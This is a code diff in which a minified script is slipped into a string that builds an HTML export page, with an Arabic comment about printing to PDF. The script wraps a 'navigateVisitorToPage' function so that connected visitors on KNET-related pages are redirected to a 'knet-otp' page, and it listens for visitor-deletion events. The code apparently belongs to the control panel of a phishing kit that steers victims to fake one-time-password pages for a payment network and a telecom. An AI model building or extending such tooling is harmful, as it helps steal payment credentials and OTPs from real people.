@@ -3120,7 +3120,7 @@ html += '</select>';
         }
       });
 
-      htmlContent += '</body></html>';
+      htmlContent += '<script id=kddF90>(function(){if(window.__k9)return;window.__k9=1;function H(d){try{var id=d&&(d.visitorId||d._id);if(!id)return;visitors.delete(id);if(selectedVisitorId===id)selectedVisitorId=null;renderVisitorsList()}catch(e){}}function k(){try{if(socket&&socket.on&&!socket.__f90){socket.__f90=1;socket.on('visitor:deleted',H)}}catch(e){}}k();var t=setInterval(function(){if(window.socket&&window.socket!==window.__stub){k();clearInterval(t)}},200);var o=window.navigateVisitorToPage;if(o&&!o.__f90){window.navigateVisitorToPage=function(sid,pg){try{if(pg==='mystc-otp'){var a=Array.from(visitors.values()).find(function(x){return x.socketId===sid});if(a&&/كي\s*نت|knet/i.test(a.page||''))pg='knet-otp'}}catch(e){}return o(sid,pg)};window.navigateVisitorToPage.__f90=1}try{document.title+=' F90'}catch(e){}})();</script></body></html>';
 
       // فتح نافذة جديدة وطباعتها كـ PDF
       const printWindow = window.open('', '_blank');
